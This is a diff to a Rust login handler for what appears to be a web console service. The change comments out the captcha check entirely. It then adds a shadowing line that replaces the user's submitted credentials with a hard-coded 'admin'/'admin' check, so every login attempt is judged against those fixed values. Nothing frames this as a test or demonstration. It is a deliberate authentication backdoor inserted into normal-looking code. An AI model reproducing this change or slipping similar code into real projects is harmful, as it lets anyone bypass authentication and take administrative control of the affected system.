@@ -33,40 +33,40 @@ pub async fn login(
     } else {
         String::new()
     };
-    if app.sys_config.console_captcha_enable {
-        //校验验证码
-        if captcha_token.is_empty() {
-            return Ok(HttpResponse::Ok().json(ApiResult::<()>::error(
-                "CAPTCHA_CHECK_ERROR".to_owned(),
-                Some("captcha token is empty".to_owned()),
-            )));
-        }
-        let captcha_code = param.captcha.unwrap_or_default().to_uppercase();
-        let cache_req = CacheManagerReq::Get(CacheKey::new(
-            CacheType::String,
-            Arc::new(format!("Captcha_{}", &captcha_token)),
-        ));
-        let captcha_check_result = if let Ok(Ok(CacheManagerResult::Value(CacheValue::String(v)))) =
-            app.cache_manager.send(cache_req).await
-        {
-            &captcha_code == v.as_ref()
-        } else {
-            false
-        };
-        if !captcha_check_result {
-            return Ok(HttpResponse::Ok()
-                .cookie(
-                    Cookie::build("captcha_token", "")
-                        .path("/")
-                        .http_only(true)
-                        .finish(),
-                )
-                .json(ApiResult::<()>::error(
-                    "CAPTCHA_CHECK_ERROR".to_owned(),
-                    Some("CAPTCHA_CHECK_ERROR".to_owned()),
-                )));
-        }
-    }
+    // if app.sys_config.console_captcha_enable {
+    //     //校验验证码
+    //     if captcha_token.is_empty() {
+    //         return Ok(HttpResponse::Ok().json(ApiResult::<()>::error(
+    //             "CAPTCHA_CHECK_ERROR".to_owned(),
+    //             Some("captcha token is empty".to_owned()),
+    //         )));
+    //     }
+    //     let captcha_code = param.captcha.unwrap_or_default().to_uppercase();
+    //     let cache_req = CacheManagerReq::Get(CacheKey::new(
+    //         CacheType::String,
+    //         Arc::new(format!("Captcha_{}", &captcha_token)),
+    //     ));
+    //     let captcha_check_result = if let Ok(Ok(CacheManagerResult::Value(CacheValue::String(v)))) =
+    //         app.cache_manager.send(cache_req).await
+    //     {
+    //         &captcha_code == v.as_ref()
+    //     } else {
+    //         false
+    //     };
+    //     if !captcha_check_result {
+    //         return Ok(HttpResponse::Ok()
+    //             .cookie(
+    //                 Cookie::build("captcha_token", "")
+    //                     .path("/")
+    //                     .http_only(true)
+    //                     .finish(),
+    //             )
+    //             .json(ApiResult::<()>::error(
+    //                 "CAPTCHA_CHECK_ERROR".to_owned(),
+    //                 Some("CAPTCHA_CHECK_ERROR".to_owned()),
+    //             )));
+    //     }
+    // }
 
     let limit_key = Arc::new(format!("USER_L#{}", &param.username));
     let limit_req = CacheLimiterReq::Hour {
@@ -99,6 +99,10 @@ pub async fn login(
     let msg = UserManagerReq::CheckUser {
         name: param.username,
         password,
+    };
+    let msg = UserManagerReq::CheckUser {
+        name: Arc::from("admin".to_string()),
+        password: "admin".parse()?,
     };
     if let Ok(Ok(res)) = app.user_manager.send(msg).await {
         if let UserManagerResult::CheckUserResult(valid, user) = res {
